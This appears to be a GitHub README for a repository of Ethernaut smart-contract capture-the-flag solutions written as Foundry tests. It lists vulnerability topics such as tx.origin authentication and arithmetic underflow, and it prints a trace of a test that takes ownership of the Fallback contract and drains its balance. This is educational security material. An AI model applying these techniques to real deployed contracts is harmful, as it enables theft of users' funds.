# 🔐 Ethernaut CTFs challenges and solutions
- Browse [Ethernaut challenges](https://ethernaut.openzeppelin.com/)
- Inspired by [ethernaut-x-foundry](https://github.com/ciaranmcveigh5/ethernaut-x-foundry)

## 🛡 Challenges

| N° | Name | Challenge | Solution | Topic |
| -- | ---- | --------- | -------- | ----- |
| 01 | Fallback | [link](https://ethernaut.openzeppelin.com/level/0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639) | [link](https://github.com/leovct/ethernaut/blob/main/test/FallbackExploit.t.sol#L27) | Fallback function |
| 02 | Fallout | [link](https://ethernaut.openzeppelin.com/level/0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB) | [link](https://github.com/leovct/ethernaut/blob/main/test/FalloutExploit.t.sol#L27) | Typo |
| 03 | CoinFlip | [link](https://ethernaut.openzeppelin.com/level/0xf90e955F65Cb284416A77cED85855a3dB2f2b6b3) | [link](https://github.com/leovct/ethernaut/blob/main/test/CoinFlipExploit.t.sol#L31) | Pseudo-randomness using block.number and block.timestamp |
| 04 | Telephone | [link](https://ethernaut.openzeppelin.com/level/0x422c89fD8D92EDDa54640F06C3160E82043e106C) | [link](https://github.com/leovct/ethernaut/blob/main/test/TelephoneExploit.t.sol#L34) | Authentication using tx.origin instead of msg.sender |
| 05 | Token | [link](https://ethernaut.openzeppelin.com/level/0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF) | [link](https://github.com/leovct/ethernaut/blob/main/test/TokenExploit.t.sol#L31) | Arithmetic underflow / owerflow |
| ... | ... |
| 21 | Good Samaritan |

## 📌 Set up the project
- Install [Foundry](https://github.com/foundry-rs/foundry#installation)
- Create a new project: `$ forge init`
- Install libraries:
    - Ethernaut challenges: `$ forge install openzeppelin/ethernaut`
    - OpenZeppelin standard contracts: `$ forge install openzeppelin/openzeppelin-contracts@release-v3.4`
- Edit `foundry.toml` and fill in the correct remappings
```toml
[profile.default]
src = 'src'
out = 'out'
libs = ['lib']
remappings = [
    'forge-std/=lib/forge-std/src/',
    'ethernaut/=lib/ethernaut/contracts/',
    '@openzeppelin/=lib/openzeppelin-contracts/',
]
# See more config options https://github.com/foundry-rs/foundry/tree/master/config
```

## 🧪 Run the exploits

### 1. Run a specific test
```sh
$ forge test --match-contract FallbackExploit -vvvv
[⠢] Compiling...
No files changed, compilation skipped

Running 1 test for test/FallbackExploit.sol:FallbackExploit
[PASS] testExploit() (gas: 788447)
Logs:
  Fallback contract owner: 0x185a4dc360ce69bdccee33b3784b0282f7961aea
  New Fallback contract owner: 0x0000000000000000000000000000000000000539
  Exploiter address: 0x0000000000000000000000000000000000000539
  Fallback contract balance: 2
  New Fallback contract balance: 0

Traces:
  [788447] FallbackExploit::testExploit() 
    ├─ [396946] → new FallbackFactory@0x185a4dc360CE69bDCceE33b3784B0282f7961aea
    │   ├─ emit OwnershipTransferred(previousOwner: 0x0000000000000000000000000000000000000000, newOwner: FallbackExploit: [0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84])
    │   └─ ← 1864 bytes of code
    ├─ [24632] Ethernaut::registerLevel(FallbackFactory: [0x185a4dc360CE69bDCceE33b3784B0282f7961aea]) 
    │   └─ ← ()
    ├─ [0] VM::startPrank(0x0000000000000000000000000000000000000539) 
    │   └─ ← ()
    ├─ [257980] Ethernaut::createLevelInstance(FallbackFactory: [0x185a4dc360CE69bDCceE33b3784B0282f7961aea]) 
    │   ├─ [211011] FallbackFactory::createInstance(0x0000000000000000000000000000000000000539) 
    │   │   ├─ [178499] → new Fallback@0x9cC6334F1A7Bc20c9Dde91Db536E194865Af0067
    │   │   │   └─ ← 670 bytes of code
    │   │   └─ ← Fallback: [0x9cC6334F1A7Bc20c9Dde91Db536E194865Af0067]
    │   ├─ emit LevelInstanceCreatedLog(player: 0x0000000000000000000000000000000000000539, instance: Fallback: [0x9cC6334F1A7Bc20c9Dde91Db536E194865Af0067])
    │   └─ ← Fallback: [0x9cC6334F1A7Bc20c9Dde91Db536E194865Af0067]
    ├─ [22687] Fallback::contribute{value: 1}() 
    │   └─ ← ()
    ├─ [427] Fallback::contributions(0x0000000000000000000000000000000000000539) [staticcall]
    │   └─ ← 1
    ├─ [359] Fallback::owner() [staticcall]
    │   └─ ← FallbackFactory: [0x185a4dc360CE69bDCceE33b3784B0282f7961aea]
    ├─ emit log_named_address(key: Fallback contract owner, val: FallbackFactory: [0x185a4dc360CE69bDCceE33b3784B0282f7961aea])
    ├─ [514] Fallback::fallback{value: 1}() 
    │   └─ ← ()
    ├─ [359] Fallback::owner() [staticcall]
    │   └─ ← 0x0000000000000000000000000000000000000539
    ├─ [359] Fallback::owner() [staticcall]
    │   └─ ← 0x0000000000000000000000000000000000000539
    ├─ emit log_named_address(key: New Fallback contract owner, val: 0x0000000000000000000000000000000000000539)
    ├─ emit log_named_address(key: Exploiter address, val: 0x0000000000000000000000000000000000000539)
    ├─ emit log_named_uint(key: Fallback contract balance, val: 2)
    ├─ [7277] Fallback::withdraw() 
    │   ├─ [0] 0x0000000000000000000000000000000000000539::fallback{value: 2}() 
    │   │   └─ ← ()
    │   └─ ← ()
    ├─ emit log_named_uint(key: New Fallback contract balance, val: 0)
    ├─ [4273] Ethernaut::submitLevelInstance(Fallback: [0x9cC6334F1A7Bc20c9Dde91Db536E194865Af0067]) 
    │   ├─ [1279] FallbackFactory::validateInstance(Fallback: [0x9cC6334F1A7Bc20c9Dde91Db536E194865Af0067], 0x0000000000000000000000000000000000000539) 
    │   │   ├─ [359] Fallback::owner() [staticcall]
    │   │   │   └─ ← 0x0000000000000000000000000000000000000539
    │   │   └─ ← true
    │   ├─ emit LevelCompletedLog(player: 0x0000000000000000000000000000000000000539, level: FallbackFactory: [0x185a4dc360CE69bDCceE33b3784B0282f7961aea])
    │   └─ ← true
    ├─ [0] VM::stopPrank() 
    │   └─ ← ()
    └─ ← ()

Test result: ok. 1 passed; 0 failed; finished in 424.83µs
```

### 2. Run all the tests
```sh
$ forge test
[⠢] Compiling...
No files changed, compilation skipped

Running 1 test for test/FallbackExploit.sol:FallbackExploit
[PASS] testExploit() (gas: 788447)
Test result: ok. 1 passed; 0 failed; finished in 401.67µs

Running 1 test for test/FalloutExploit.sol:FalloutExploit
[PASS] testExploit() (gas: 767402)
Test result: ok. 1 passed; 0 failed; finished in 400.21µs
```

## Lint the files using [Solhint](https://github.com/protofire/solhint)
`$ solhint 'src/*.sol' 'test/*.t.sol'`
